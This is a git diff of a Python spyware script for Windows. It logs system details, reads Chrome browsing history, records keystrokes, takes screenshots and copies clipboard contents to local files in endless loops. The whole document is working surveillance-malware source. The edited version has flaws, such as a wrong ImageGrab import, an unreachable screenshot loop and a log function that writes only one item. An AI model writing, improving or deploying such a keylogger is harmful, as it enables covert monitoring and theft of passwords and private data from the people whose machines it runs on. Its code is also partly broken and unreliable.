@@ -1,12 +1,14 @@
-from pynput.keyboard import Key, Listener #recording keystrokes
-import sqlite3 #get the data from a database
-import datetime #get the date
-import socket #get computer information
-import platform #get computer information
-from requests import get #get information from a website
-import win32clipboard #get clipboard information
-from PIL import ImageGrab #get screenshot
-import pandas as pd #manipulate with the aquired data
+import time
+import win32clipboard
+import datetime
+import pynput
+from pynput.keyboard import Key, Listener
+import sqlite3
+import datetime
+import socket
+import platform
+import pandas as pd
+import ImageGrab
 
 #gets the computer information and store it in text file
 date = datetime.date.today()
@@ -26,9 +28,7 @@ data = {
 df = pd.DataFrame(data)
 df.to_excel('computer_information.xlsx', index=False)
 
-
 #get history of google chrome
-
 # Connect to the Google Chrome history database
 conn = sqlite3.connect('C:\\Users\\admin\\Desktop\\History')  # add your path
 cursor = conn.cursor()
@@ -47,9 +47,30 @@ df.to_excel(excel_file, index=False)
 # Close the database connection
 conn.close()
 
+k = []
+
+def on_press(key):
+    k.append(key)
+    current_date = datetime.datetime.now()
+    write_file([current_date, key])
+    print(key)
+
+def write_file(var):
+    with open("logs.txt", "a") as f:
+        for i in var:
+            new_var = str(i).replace("'", "")
+        f.write(new_var)
+        f.write(" ")
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+# Start the keystroke listener
+listener = Listener(on_press=on_press, on_release=on_release)
+listener.start()
 
 #get the screenshot
-
 def screenshot():
     try:
         im = ImageGrab.grab()
@@ -61,47 +82,24 @@ def screenshot():
 screenshot()
 
 
-#get the clipboard information and store it in text file
-
-import win32clipboard
+# Copy clipboard data every 30 seconds
 def copy_clipboard():
     current_date = datetime.datetime.now()
     with open("clipboard.txt", "a") as f:
         
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard() #get the clipboard data and store it in pasted_data
+        win32clipboard.OpenClipboard()
+        pasted_data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
 
-            f.write("\n")
-            f.write("date and time:"+ str(current_date)+"\n")
-            f.write("clipboard data: \n "+ pasted_data) #write the clipboard data into the text file
-        
-copy_clipboard()
+        f.write("\n")
+        f.write("date and time:"+ str(current_date)+"\n")
+        f.write("clipboard data: \n "+ pasted_data)
 
+while True:
+    copy_clipboard()
+    time.sleep(30) # wait for 30 seconds before copying again
 
-#records keystrokes and store it in text file
-k = []
-
-#function to record the keystroke
-def on_press(key):
-    k.append(key)
-    write_file(k)
-    print(key)
-
-#function to write the data to a text file
-def write_file(var):
-    with open("logs.txt", "a") as f:
-        for i in var:
-            new_var = str(i).replace("'", "")
-        f.write(new_var)
-        f.write(" ")
-
-#function to stop the recording
-def on_release(key):
-    if key == Key.esc:
-        return False
-
-#listener function
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-
+# take a screenshot every 10 seconds
+while True:
+    screenshot()
+    time.sleep(10)
